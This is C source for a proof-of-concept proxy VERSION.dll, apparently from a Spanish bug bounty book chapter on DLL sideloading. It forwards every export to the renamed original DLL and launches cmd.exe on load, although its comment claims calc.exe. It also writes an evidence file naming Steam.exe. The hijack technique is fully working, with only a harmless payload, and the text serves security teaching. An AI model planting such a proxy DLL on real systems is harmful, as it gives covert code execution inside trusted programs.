// Extraído de: LibroBugBounty/cap-06-dll-sideloading.md
/*
 * Proxy DLL para VERSION.dll â€” PoC de DLL sideloading
 * Forwardea todos los exports a la DLL original (renombrada)
 * Ejecuta payload en DllMain al cargarse
 *
 * Compilar con mingw en el contenedor Docker:
 * x86_64-w64-mingw32-gcc -shared -o VERSION.dll proxy_version.c
 *    -Wl,--enable-stdcall-fixup
 *
 * AVISO: Solo para investigaciÃ³n de seguridad autorizada.
 */

#include <windows.h>
#include <stdio.h>

/* Forward exports a la DLL original (renombrada a VERSION_orig.dll) */
#pragma comment(linker, "/export:GetFileVersionInfoA=VERSION_orig.GetFileVersionInfoA")
#pragma comment(linker, "/export:GetFileVersionInfoByHandle=VERSION_orig.GetFileVersionInfoByHandle")
#pragma comment(linker, "/export:GetFileVersionInfoExA=VERSION_orig.GetFileVersionInfoExA")
#pragma comment(linker, "/export:GetFileVersionInfoExW=VERSION_orig.GetFileVersionInfoExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeA=VERSION_orig.GetFileVersionInfoSizeA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExA=VERSION_orig.GetFileVersionInfoSizeExA")
#pragma comment(linker, "/export:GetFileVersionInfoSizeExW=VERSION_orig.GetFileVersionInfoSizeExW")
#pragma comment(linker, "/export:GetFileVersionInfoSizeW=VERSION_orig.GetFileVersionInfoSizeW")
#pragma comment(linker, "/export:GetFileVersionInfoW=VERSION_orig.GetFileVersionInfoW")
#pragma comment(linker, "/export:VerFindFileA=VERSION_orig.VerFindFileA")
#pragma comment(linker, "/export:VerFindFileW=VERSION_orig.VerFindFileW")
#pragma comment(linker, "/export:VerInstallFileA=VERSION_orig.VerInstallFileA")
#pragma comment(linker, "/export:VerInstallFileW=VERSION_orig.VerInstallFileW")
#pragma comment(linker, "/export:VerLanguageNameA=VERSION_orig.VerLanguageNameA")
#pragma comment(linker, "/export:VerLanguageNameW=VERSION_orig.VerLanguageNameW")
#pragma comment(linker, "/export:VerQueryValueA=VERSION_orig.VerQueryValueA")
#pragma comment(linker, "/export:VerQueryValueW=VERSION_orig.VerQueryValueW")

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason,
                    LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        /* PoC: demostrar ejecuciÃ³n de cÃ³digo */
        /* Un atacante real ejecutarÃ­a payload malicioso aquÃ­ */

        /* OpciÃ³n 1: Abrir calc.exe (visual, para screenshot) */
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcessA(NULL, "cmd.exe", NULL, NULL,
                       FALSE, 0, NULL, NULL, &si, &pi);

        /* OpciÃ³n 2: Escribir evidencia en fichero */
        FILE *f = fopen("C:\\temp\\dll_hijack_poc.txt", "w");
        if (f) {
            fprintf(f, "DLL Hijack PoC - VERSION.dll\n");
            fprintf(f, "Host process PID: %lu\n",
                    GetCurrentProcessId());
            fprintf(f, "Loaded by: Steam.exe\n");
            fclose(f);
        }
    }
    return TRUE;
}
